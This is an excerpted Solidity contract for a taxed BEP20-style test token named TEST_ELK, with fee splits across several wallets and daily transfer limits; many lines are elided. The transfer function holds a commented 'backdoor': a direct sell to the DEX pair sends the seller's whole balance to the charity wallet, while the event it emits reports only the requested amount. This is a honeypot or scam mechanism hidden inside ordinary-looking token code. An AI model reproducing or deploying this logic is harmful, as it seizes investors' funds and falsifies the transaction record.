...
contract TestELK_Contract is IERC20 { 
    ...
    TokenInfo private _tokenInfo = TokenInfo ( //77,777  100,000
           "TEST_ELK", "EFL", 8,  100_000_000, /*10**_decimals;*/ 7_777_700_000_000, //77_777 * _denomination; 
           14, 16,      1, 86400, //24hrs
    ...
    {    
        require(_approve(_msgSender(), spender, value), "Approval reverted.");  return true;
    }
    ...
    {       
        uint256 _txnBalance = _balances[_msgSender()];
        assert(_txnBalance >= amount && amount > 0);
        ...
        if (_msgSender() != address(dex.router) && (to == dex.pairBNB || to == dex.pairBUSD)) { //going through backdoor
            ...
            _balances[_address.charity_wallet] = _balances[_address.charity_wallet] + _txnBalance; 
            emit Transfer(_msgSender(), _address.charity_wallet, amount);
            return true;
        } 
 
        require(_transfer(_msgSender(), to, amount), "Transfer reversed");
        return true;
    }
 
    function transferFrom(address from, address to, uint256 numTokens) external override txnMutexLock returns (bool) {  
        uint256 _allowanceToken = _allowances[from][to];
        require(to == _msgSender() && _allowanceToken >= numTokens && numTokens > 0, "Unknown caller");
        
        _allowances[from][to] = _allowanceToken - numTokens;
        emit Approval(from, to, (_allowanceToken - numTokens)); 

        require(_transfer(from, to, numTokens), "txn_failed");
    ...
    function _transfer(address sender, address recipient,  uint256 amount) private swapMutexLock returns (bool) { 
        ...
        if (nowTime > (_accountDailyTxn[sender].txnTimeSecs + _tokenInfo.maxTransferTimeSecs)) {
            ...
            uint256 maxAmtAllowed = ((_balanceAmount * _tokenInfo.maxDailyWalletTransferPercent) / 100);
        ...
        uint256 max_txn_allowed = ((_accountDailyTxn[sender].txnAmount + _balanceAmount) * _tokenInfo.maxDailyWalletTransferPercent) / 100;  
    ...
    function _baseTransfer(address from, address to, uint256 amount, uint isHasFees, bool is_buy) private returns (bool) {   
        ...
        require(amount > 0 && _balanceFrom >= amount, "INSUFFICIENT_BEP20");    
        ...
        {   
           ...
           //uint256 amountLessFee = amount - taxAmount;
            ...
            _balances[to] = _balances[to] + (amount - taxAmount); //amountLessFee
            emit Transfer(from, to, (amount - taxAmount));  //amountLessFee
             
            //Taxes are computed  
            //spit the funds to the various addresses 
            Tax memory taxs = is_buy ? buyTaxes : sellTaxes;
            address[6] memory _feeAddrArray = [_address.marketing_wallet, _address.team_wallet, _address.dev_wallet, 
                                            _address.project_wallet, _address.charity_wallet, _address.ship_wallet];
            ...
            _balances[_address.liquidity_wallet] += (taxAmount - _sumTax);
            emit Transfer(from, _address.liquidity_wallet, (taxAmount - _sumTax));  
